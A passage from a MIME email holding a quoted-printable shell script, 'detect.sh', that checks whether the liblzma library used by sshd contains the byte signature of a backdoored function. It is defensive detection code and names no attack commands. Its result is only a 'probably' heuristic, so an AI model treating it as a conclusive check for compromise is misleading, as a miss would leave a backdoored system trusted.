8X9TKevu/2Xx4G6QuH8h/ZtIfmVF8J+jKm6c/x/GsYDH2FoBAA==

--6ajwtgiugazlov2b
Content-Type: application/x-sh
Content-Disposition: attachment; filename="detect.sh"
Content-Transfer-Encoding: quoted-printable

#! /bin/bash=0A=
=0A=
set -eu=0A=
=0A=
# find path to liblzma used by sshd=0A=
path=3D"$(ldd $(which sshd) | grep liblzma | grep -o '/[^ ]*')"=0A=
=0A=
# does it even exist?=0A=
if [ "$path" =3D=3D "" ]=0A=
then=0A=
	echo probably not vulnerable=0A=
	exit=0A=
fi=0A=
=0A=
# check for function signature=0A=
if hexdump -ve '1/1 "%.2x"' "$path" | grep -q f30f1efa554889f54c89ce5389fb8=
1e7000000804883ec28488954241848894c2410=0A=
then=0A=
	echo probably vulnerable=0A=
else=0A=
	echo probably not vulnerable=0A=
fi=0A=

--6ajwtgiugazlov2b--
